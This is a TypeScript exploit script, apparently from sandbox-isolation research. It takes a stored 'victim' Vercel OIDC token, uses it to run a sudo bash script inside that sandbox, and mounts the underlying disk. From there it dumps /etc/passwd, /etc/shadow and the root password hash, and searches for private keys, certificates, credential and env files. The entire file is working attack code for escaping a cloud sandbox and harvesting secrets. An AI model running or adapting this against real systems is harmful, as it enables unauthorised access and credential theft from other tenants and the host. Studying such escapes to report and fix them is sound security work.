import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

const EXPLORE = `#!/bin/bash
set +e
echo "===== MOUNT ====="
mkdir -p /mnt/vda2
mount -t xfs -o ro /dev/vda /mnt/vda2 2>&1 || mount -t xfs /dev/vda /mnt/vda2 2>&1
echo "mount rc=\$?"
R=/mnt/vda2
echo "===== TOP ====="
ls -la \$R 2>&1 | head
echo "===== /root ====="; ls -la \$R/root 2>&1 | head
echo "===== /home ====="; ls -la \$R/home 2>&1 | head
echo "===== /etc (hosts, resolv, passwd, shadow) ====="
cat \$R/etc/hosts 2>&1 | head
cat \$R/etc/resolv.conf 2>&1
head -20 \$R/etc/passwd 2>&1
sudo cat \$R/etc/shadow 2>&1 | head -5
echo "===== /run ====="; ls -la \$R/run 2>&1 | head -40
echo "===== /run/cell ====="; ls -la \$R/run/cell 2>&1 | head -40
echo "===== /volumes ====="; ls -la \$R/volumes 2>&1 | head -40
echo "===== /opt ====="; ls -la \$R/opt 2>&1 | head
echo "===== /srv ====="; ls -la \$R/srv 2>&1 | head
echo "===== /var ====="; ls -la \$R/var 2>&1 | head -20
echo "===== /var/lib ====="; ls -la \$R/var/lib 2>&1 | head -30
echo "===== find certs/keys ====="
find \$R -xdev \\( -name "*.pem" -o -name "*.crt" -o -name "*.key" -o -name "*.p12" -o -name "authorized_keys" -o -name "id_*" -o -name "credentials" \\) 2>/dev/null | grep -v "^\\$R/usr/" | head -40
echo "===== find config/env ====="
find \$R -xdev \\( -name "*.env*" -o -name "*.toml" -o -name "*.yaml" -o -name "*.yml" -o -name "*.conf" \\) 2>/dev/null | grep -vE "^\\$R/(usr|lib|proc|sys)" | head -50
echo "===== run/containerd ====="; ls -la \$R/run/containerd 2>&1 | head
echo "===== proc visible from cell disk ====="
ls -la \$R/proc 2>&1 | head -5
echo "===== hostname ====="; cat \$R/etc/hostname 2>&1
echo "===== machine-id ====="; cat \$R/etc/machine-id 2>&1
echo "===== shadow root hash ====="
awk -F: '/^root:/{print \$1":"\$2}' \$R/etc/shadow 2>&1
echo DONE`;

const SCRIPT = `set +e
cat > /tmp/explore-cell.sh <<'EXPLORE_EOF'
${EXPLORE}
EXPLORE_EOF
sudo unshare -m --propagation private bash /tmp/explore-cell.sh 2>&1
echo "=== unshare rc: \$? ==="
`;

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  const res = await sbx.runCommand("bash", ["-c", SCRIPT], { sudo: true, wait: true, timeout: 180_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });